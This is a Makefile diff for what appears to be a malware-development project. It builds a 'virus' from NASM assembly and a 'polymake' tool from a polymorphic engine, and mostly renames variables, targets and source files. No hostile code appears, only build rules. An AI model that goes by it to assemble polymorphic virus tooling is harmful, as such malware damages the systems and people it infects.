@@ -1,6 +1,6 @@
 ASM = nasm
 
-CC = g++
+GCC = g++
 
 AFLAGS = -felf64 -g -F dwarf
 
@@ -8,19 +8,19 @@ CFLAGS = -c -Wall -O2 -g
 
 LFLAGS = -no-pie
 
-all: virus polyengine
+all: virus polymake
 
-polyengine: polyengine.o morphengine.o
-	$(CC) $(LFLAGS) $^ -o $@
+polymake: polyengine.o polymorphicengine.o
+	$(GCC) $(LFLAGS) $^ -o $@
 	
 virus: virus.o
-	$(CC) $(LFLAGS) $< -o $@
+	$(GCC) $(LFLAGS) $< -o $@
 
-virus.o: virus.asm turnpoly.asm.inc
+virus.o: virus.asm template.asm.inc
 	$(ASM) $(AFLAGS) $< -o $@
 
-polyengine.o: polyengine.cpp
-	$(CC) $(CFLAGS) $< -o $@
+polyengine.o: polymake.cpp
+	$(GCC) $(CFLAGS) $< -o $@
 
-morphengine.o: morphengine.asm
+polymorphicengine.o: polymorphicengine.asm
 	$(ASM) $(AFLAGS) $< -o $@
